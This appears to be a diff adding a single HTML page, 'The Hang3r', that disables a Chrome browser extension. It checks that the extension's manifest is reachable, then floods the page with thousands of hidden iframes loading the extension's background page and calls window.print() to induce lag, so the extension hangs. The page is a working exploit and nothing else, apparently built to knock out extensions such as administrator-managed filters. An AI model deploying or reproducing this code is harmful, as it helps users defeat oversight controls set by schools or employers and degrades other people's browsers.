@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>The Hang3r</title>
+  <style>
+    body {
+      background-color: #1e1e1e;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+    #status {
+      color: orange;
+      margin-bottom: 2rem;
+    }
+    #cancel {
+      background-color: #d32f2f;
+      color: white;
+      padding: 0.75rem 1.5rem;
+      border: none;
+      border-radius: 0.5rem;
+      cursor: pointer;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <h1>Disabling Extension...</h1>
+  <div id="status">Checking extension access...</div>
+  <button id="cancel">Cancel</button>
+
+  <script>
+    const params = new URLSearchParams(location.search);
+    const extensionId = params.get("id");
+    const extensionName = params.get("name");
+    const iframeCount = parseInt(params.get("count")) || 2500;
+    const statusEl = document.getElementById("status");
+
+    const checker = document.createElement("iframe");
+    checker.style.display = "none";
+    checker.src = `chrome-extension://${extensionId}/manifest.json`;
+
+    checker.onload = () => {
+      statusEl.textContent = "Extension accessible. Launching...";
+      launchHang();
+    };
+
+    checker.onerror = () => {
+      statusEl.innerHTML = "<span class='error'>Extension not accessible or blocked.</span>";
+    };
+
+    document.body.appendChild(checker);
+
+    function launchHang() {
+      for (let i = 0; i < iframeCount; i++) {
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = `chrome-extension://${extensionId}/_generated_background_page.html`;
+        document.body.appendChild(iframe);
+      }
+
+      setTimeout(() => {
+        window.print(); // induces lag
+      }, 1000);
+    }
+
+    document.getElementById("cancel").addEventListener("click", () => {
+      window.close(); // will be detected by index.html
+    });
+  </script>
+</body>
+</html>
